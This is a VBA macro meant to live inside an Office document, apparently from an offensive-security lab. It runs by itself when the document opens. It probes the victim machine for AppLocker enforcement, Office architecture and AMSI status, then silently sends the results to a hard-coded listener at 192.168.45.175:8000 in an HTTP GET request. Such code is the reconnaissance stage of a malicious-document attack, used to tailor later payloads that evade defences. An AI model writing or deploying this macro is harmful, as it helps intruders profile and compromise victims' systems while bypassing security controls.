Option Explicit

Sub AutoOpen()
    CheckSystemStatus
End Sub

Sub DocumentOpen()
    CheckSystemStatus
End Sub

Sub Workbook_Open()
    CheckSystemStatus
End Sub

Sub AutoExec()
    CheckSystemStatus
End Sub

' Main function that calls the separate functions
Sub CheckSystemStatus()
    Dim strUrl As String
    Dim applockerStatus As String
    Dim archStatus As String
    Dim amsiStatus As String
    Dim result As String
    Dim hReq As Object
    
    ' Call separate functions to get status
    applockerStatus = CheckAppLockerStatus()
    archStatus = CheckArchitecture()
    amsiStatus = CheckAMSIStatus()
    ' Combine results
    result = "AppLocker=" & applockerStatus & "&Architecture=" & archStatus & "&AMSI=" & amsiStatus
    
    ' Change URL
    strUrl = "http://192.168.45.175:8000/status.txt?" & result
        
    ' Send GET request
    Set hReq = CreateObject("MSXML2.XMLHTTP")
    
    On Error Resume Next
    With hReq
        .Open "GET", strUrl, False
        .Send
    End With
    On Error GoTo 0
    
    ' Clean up
    Set hReq = Nothing
    
End Sub

' Function to check AppLocker status
Function CheckAppLockerStatus() As String
    Dim WindowShell As Object
    Dim regValue
    Dim status As String
    
    Set WindowShell = CreateObject("WScript.shell")
    
    On Error Resume Next
    regValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe")
    
    If Err <> 0 Then
        status = "on"   ' AppLocker is on (registry key not found)
    Else
        status = "off"  ' AppLocker is off (registry key found)
    End If
    
    On Error GoTo 0
    Set WindowShell = Nothing
    
    CheckAppLockerStatus = status
End Function

' Function to check system architecture
Function CheckArchitecture() As String
    Dim processName As String
    Dim wmiService As Object
    Dim processList As Object
    Dim processItem As Object
    Dim is64Bit As Boolean
    Dim architecture As String
    
    ' Use the process you are using: winword.exe, excel.exe, powerpnt.exe
    processName = "winword.exe"
    
    ' Create WMI query and get process list
    On Error Resume Next
    Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
    Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")
    
    ' Check if process is found and determine 64-bit status
    If processList.Count > 0 Then
        For Each processItem In processList
            is64Bit = InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0
            If is64Bit Then
                architecture = "x64"
            Else
                architecture = "x86"
            End If
        Next
    Else
        architecture = "Unknown"
    End If
    
    ' Clean up
    Set wmiService = Nothing
    Set processList = Nothing
    On Error GoTo 0
    
    CheckArchitecture = architecture
End Function

Function CheckAMSIStatus() As String
    Dim WindowShell As Object
    Dim amsiRegValue
    Dim status As String
    
    status = "unknown"  ' Default status
    
    Set WindowShell = CreateObject("WScript.shell")
    
    On Error Resume Next
    
    ' Method 1: Check AMSI scanner enablement
    amsiRegValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\FeatureFeatures\BypassAMSI")
    
    If Err.Number = 0 Then
        If amsiRegValue = 1 Then
            status = "disabled"  ' AMSI disabled
        Else
            status = "enabled"   ' AMSI enabled
        End If
    Else
        Err.Clear
        
        ' Method 2: Check for AMSI provider registration
        amsiRegValue = WindowShell.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers")
        
        If Err.Number = 0 Then
            status = "enabled"   ' AMSI providers found
        Else
            status = "likely_enabled"  ' Default to enabled (most modern Windows systems)
        End If
    End If
    
    Set WindowShell = Nothing
    On Error GoTo 0
    
    CheckAMSIStatus = status
End Function

